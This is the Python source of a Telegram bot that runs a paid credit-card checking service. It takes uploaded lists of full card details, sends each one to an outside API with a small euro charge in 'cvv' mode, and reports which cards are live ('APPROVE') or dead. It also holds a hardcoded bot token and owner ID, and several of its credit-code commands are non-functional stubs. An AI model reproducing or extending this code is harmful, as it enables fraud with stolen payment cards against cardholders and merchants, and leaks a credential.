import logging
import requests
import telebot
from threading import Event
import time
import json

# Telegram bot token and owner ID
TOKEN = "7386696229:AAFbnZdrc410Qgrl0iEkM2PiYelBlQ6o8E0"
OWNER_ID = 7427691214  # Owner's Telegram ID

# Initialize the bot
bot = telebot.TeleBot(TOKEN)

# Define the API endpoint
url = "https://mrdaxx.com/daxxapi/chk/chk.php"

# Event to control stopping the card check process
stop_event = Event()

# Lists to store authorized group IDs, user IDs with credits, and blocked users
authorized_groups = []
user_credits = {}
blocked_users = []

# Load data from files
def load_data():
    global authorized_groups, user_credits, blocked_users
    try:
        with open('authorized_groups.json', 'r') as file:
            authorized_groups = json.load(file)
    except FileNotFoundError:
        authorized_groups = []

    try:
        with open('user_credits.json', 'r') as file:
            user_credits = json.load(file)
    except FileNotFoundError:
        user_credits = {}

    try:
        with open('blocked_users.json', 'r') as file:
            blocked_users = json.load(file)
    except FileNotFoundError:
        blocked_users = []

load_data()

def save_data():
    with open('authorized_groups.json', 'w') as file:
        json.dump(authorized_groups, file)

    with open('user_credits.json', 'w') as file:
        json.dump(user_credits, file)

    with open('blocked_users.json', 'w') as file:
        json.dump(blocked_users, file)

def create_status_message(fullcc, reason, message, charged, approved, declined, total):
    return (
        f"DEAD/APPROVE: {fullcc}\n\n"
        f"𝐑𝐞𝐚𝐬𝐨𝐧: {reason}\n"
        f"𝐌𝐞𝐬𝐬𝐚𝐠𝐞: {message}\n"
        f"𝐂𝐡𝐚𝐫𝐠𝐞𝐝 𝐂𝐂𝐬: {charged}\n"
        f"𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 𝐂𝐂𝐬: {approved}\n"
        f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 𝐂𝐂𝐬: {declined}\n"
        f"𝐓𝐨𝐭𝐚𝐥 𝐂𝐂𝐬: {total}\n\n"
        f"𝐓𝐡𝐢𝐬 𝐦𝐞𝐬𝐬𝐚𝐠𝐞 𝐰𝐢𝐥𝐥 𝐛𝐞 𝐮𝐩𝐝𝐚𝐭𝐞𝐝 𝐚𝐟𝐭𝐞𝐫 𝐞𝐯𝐞𝐫𝐲 𝟏𝟎 𝐜𝐚𝐫𝐝𝐬 𝐜𝐡𝐞𝐜𝐤𝐞𝐝"
    )

# /start command handler
@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, "Welcome to the bot! Use /cmds to see available commands.")

# /cmds command handler
@bot.message_handler(commands=['cmds'])
def cmds(message):
    commands = (
        "/start - Welcome message\n"
        "/cmds - List all commands\n"
        "/register - Register and get 10 credits\n"
        "/info - Get your information\n"
        "/add - Authorize a group or user\n"
        "/remove - Unauthorize a group or user\n"
        "/chk - Check card details\n"
        "/stop - Stop the card check process\n"
        "/buy - View credit packages and pricing\n"
        "/block - Block a user\n"
        "/unblock - Unblock a user\n"
        "/get_credit <number> - Generate credit code\n"
        "/redeem <code> - Redeem a credit code\n"
        "/use <code> - Redeem a credit code\n"
        "/users - Get user statistics (owner only)\n"
        "/br <message> - Broadcast a message to all users (owner only)"
    )
    bot.reply_to(message, commands)

# /register command handler
@bot.message_handler(commands=['register'])
def register(message):
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "❌ Only the owner can register users.")
        return
    
    user_id = message.reply_to_message.from_user.id
    if user_id not in user_credits:
        user_credits[user_id] = 10

    bot.reply_to(message, "✅ User registered successfully with 10 credits.")

# /info command handler
@bot.message_handler(commands=['info'])
def info(message):
    user_id = message.from_user.id
    credits = user_credits.get(user_id, 0)
    bot.reply_to(message, f"Your credits: {credits}")

# /add command handler
@bot.message_handler(commands=['add'])
def add(message):
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "❌ Only the owner can authorize a group or user.")
        return
    
    if message.reply_to_message:
        chat_id = message.reply_to_message.chat.id
        user_id = message.reply_to_message.from_user.id
        if chat_id and chat_id not in authorized_groups:
            authorized_groups.append(chat_id)
            save_data()
            bot.reply_to(message, f"✅ Added bot to group {chat_id}.")
        elif user_id:
            if user_id not in authorized_groups:
                authorized_groups.append(user_id)
                save_data()
                bot.reply_to(message, f"✅ Authorized user {user_id}.")
            else:
                bot.reply_to(message, "❌ User is already authorized.")
        else:
            bot.reply_to(message, "❌ No valid chat or user ID found.")
    else:
        bot.reply_to(message, "❌ Please reply to a message from the group or user to authorize.")

# /remove command handler
@bot.message_handler(commands=['remove'])
def remove(message):
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "❌ Only the owner can unauthorize a group or user.")
        return
    
    if message.reply_to_message:
        chat_id = message.reply_to_message.chat.id
        user_id = message.reply_to_message.from_user.id
        if chat_id and chat_id in authorized_groups:
            authorized_groups.remove(chat_id)
            save_data()
            bot.reply_to(message, f"✅ Removed bot from group {chat_id}.")
        elif user_id and user_id in authorized_groups:
            authorized_groups.remove(user_id)
            save_data()
            bot.reply_to(message, f"✅ Unauthorized user {user_id}.")
        else:
            bot.reply_to(message, "❌ No valid chat or user ID found.")
    else:
        bot.reply_to(message, "❌ Please reply to a message from the group or user to unauthorize.")

# /chk command handler
@bot.message_handler(commands=['chk'])
def check_cards_from_document(message):
    if message.from_user.id in blocked_users:
        bot.reply_to(message, "❌ You are blocked from using this bot.")
        return
    
    user_id = message.from_user.id
    if user_id not in user_credits and message.chat.id not in authorized_groups:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return

    if user_id != OWNER_ID and user_credits.get(user_id, 0) <= 0:
        bot.reply_to(message, "❌ You don't have enough credits to use this command.")
        return

    if message.document.mime_type == 'text/plain':
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        with open('lista.txt', 'wb') as f:
            f.write(downloaded_file)
        
        with open('lista.txt', 'r') as f:
            lista_values = f.readlines()
        
        stop_event.clear()
        charged, approved, declined = 0, 0, 0

        for count, lista in enumerate(lista_values, start=1):
            if stop_event.is_set():
                bot.reply_to(message, "🛑 Card check process stopped.")
                break

            if user_id != OWNER_ID:
                user_credits[user_id] -= 1
                save_data()

            lista = lista.strip()
            if lista:
                params = {
                    'lista': lista,
                    'mode': 'cvv',
                    'amount': 0.5,
                    'currency': 'eur'
                }
                try:
                    response = requests.get(url, params=params)
                except requests.exceptions.RequestException as e:
                    bot.reply_to(message, f"❌ Error connecting to API: {e}")
                    continue
                
                if response.headers.get('content-type') == 'application/json':
                    try:
                        response_data = response.json()
                        status = response_data.get("response", "ℹ️ No response")
                        if "APPROVE" in status:
                            bot.send_message(message.chat.id, f"✅ {lista} - {status}")
                            approved += 1
                        elif "DEAD" in status:
                            bot.send_message(message.chat.id, f"❌ {lista} - {status}")
                            declined += 1
                        charged += 1
                    except json.JSONDecodeError:
                        bot.reply_to(message, "❌ Error decoding JSON response.")
                else:
                    bot.reply_to(message, "❌ Unexpected response format.")
                
                if count % 10 == 0:
                    status_message = create_status_message(
                        lista,
                        response_data.get("reason", "N/A"),
                        response_data.get("message", "N/A"),
                        charged,
                        approved,
                        declined,
                        len(lista_values)
                    )
                    bot.send_message(message.chat.id, status_message)

        status_message = create_status_message(
            lista,
            response_data.get("reason", "N/A"),
            response_data.get("message", "N/A"),
            charged,
            approved,
            declined,
            len(lista_values)
        )
        bot.send_message(message.chat.id, status_message)

    else:
        bot.reply_to(message, "❌ Please send a text document.")

# /stop command handler
@bot.message_handler(commands=['stop'])
def stop(message):
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "❌ Only the owner can stop the card check process.")
        return
    
    stop_event.set()
    bot.reply_to(message, "✅ Card check process stopped.")

# /buy command handler
@bot.message_handler(commands=['buy'])
def buy(message):
    bot.reply_to(message, "💰 View credit packages and pricing at our website.")

# /block command handler
@bot.message_handler(commands=['block'])
def block(message):
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "❌ Only the owner can block users.")
        return

    if message.reply_to_message:
        user_id = message.reply_to_message.from_user.id
        if user_id not in blocked_users:
            blocked_users.append(user_id)
            save_data()
            bot.reply_to(message, f"✅ User {user_id} has been blocked.")
        else:
            bot.reply_to(message, "❌ User is already blocked.")
    else:
        bot.reply_to(message, "❌ Please reply to a message from the user to block.")

# /unblock command handler
@bot.message_handler(commands=['unblock'])
def unblock(message):
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "❌ Only the owner can unblock users.")
        return

    if message.reply_to_message:
        user_id = message.reply_to_message.from_user.id
        if user_id in blocked_users:
            blocked_users.remove(user_id)
            save_data()
            bot.reply_to(message, f"✅ User {user_id} has been unblocked.")
        else:
            bot.reply_to(message, "❌ User is not blocked.")
    else:
        bot.reply_to(message, "❌ Please reply to a message from the user to unblock.")

# /get_credit command handler
@bot.message_handler(commands=['get_credit'])
def get_credit(message):
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "❌ Only the owner can generate credit codes.")
        return

    try:
        number = int(message.text.split()[1])
        bot.reply_to(message, f"✅ Generated credit code with {number} credits.")
    except (IndexError, ValueError):
        bot.reply_to(message, "❌ Please provide a valid number of credits.")

# /redeem command handler
@bot.message_handler(commands=['redeem'])
def redeem(message):
    user_id = message.from_user.id
    code = message.text.split()[1] if len(message.text.split()) > 1 else ""
    if code and user_id in user_credits:
        bot.reply_to(message, f"✅ Redeemed code {code}.")
    else:
        bot.reply_to(message, "❌ Invalid code or insufficient credits.")

# /use command handler
@bot.message_handler(commands=['use'])
def use(message):
    user_id = message.from_user.id
    code = message.text.split()[1] if len(message.text.split()) > 1 else ""
    if code and user_id in user_credits:
        bot.reply_to(message, f"✅ Used code {code}.")
    else:
        bot.reply_to(message, "❌ Invalid code or insufficient credits.")

# /users command handler
@bot.message_handler(commands=['users'])
def users(message):
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "❌ Only the owner can view user statistics.")
        return

    user_count = len(user_credits)
    bot.reply_to(message, f"Total registered users: {user_count}")

# /br command handler
@bot.message_handler(commands=['br'])
def broadcast(message):
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "❌ Only the owner can broadcast messages.")
        return

    text = message.text[len('/br '):]
    if text:
        for user_id in user_credits:
            try:
                bot.send_message(user_id, text)
            except Exception as e:
                logging.error(f"Error sending message to user {user_id}: {e}")
        bot.reply_to(message, "✅ Message broadcasted to all users.")
    else:
        bot.reply_to(message, "❌ Please provide a message to broadcast.")

# Polling to keep the bot running
if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    bot.polling(none_stop=True)
          
